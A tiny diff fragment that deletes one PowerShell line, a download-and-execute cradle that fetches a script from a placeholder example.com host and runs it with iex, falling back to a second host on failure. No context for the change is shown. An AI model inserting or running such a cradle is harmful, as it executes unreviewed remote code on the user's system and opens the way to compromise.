@@ -1,1 +1,0 @@
-try { iex (iwr 'http://primary.example.com/script.ps1' -UseBasicParsing) } catch { iex (iwr 'http://backup.example.com/script.ps1' -UseBasicParsing) }
